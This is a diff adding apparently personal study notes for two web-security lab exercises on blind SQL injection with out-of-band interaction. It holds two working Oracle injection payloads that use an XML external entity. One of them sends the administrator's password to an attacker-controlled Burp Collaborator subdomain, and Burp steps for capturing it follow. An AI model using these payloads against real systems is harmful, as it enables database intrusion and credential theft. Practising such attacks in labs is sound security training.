@@ -1,0 +1,26 @@
+Reminder: Always URL encode!
+
+Lab Title: Blind SQL injection with out-of-band interaction
+
+Sample payload:
+x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3D"1.0"+encoding%3D"UTF-8"%df><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//x.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+# ========================================= #
+
+Lab Title: Blind SQL injection with out-of-band data exfiltration
+Remider: Change the sub-domain. Copy from Collaborator
+Sample payload: 
+x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.rkfwh6i4wrcdfm954ol1szqij9pzdo.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+
+# == HOW TO USE COLLABORATOR == #
+
+1. Intercept then send to repeater
+2. Turn of the intercept
+3. Go to repeater and paste the payload
+3. On Menu > Click Burp tab > Burp Collaborator client
+4. Click 'Copy to clipboard' to copy the subdomain/domain
+5. Go to repeater and replace the subdomain/domain from the clipboard
+6. From repeater, click send. The response musn't have error.
+7. Go to collaborator then click 'Poll now' > click HTTP > click 'Response to collaborator tab'
+8. The Host value must be: <password>.subdomain.domain.com
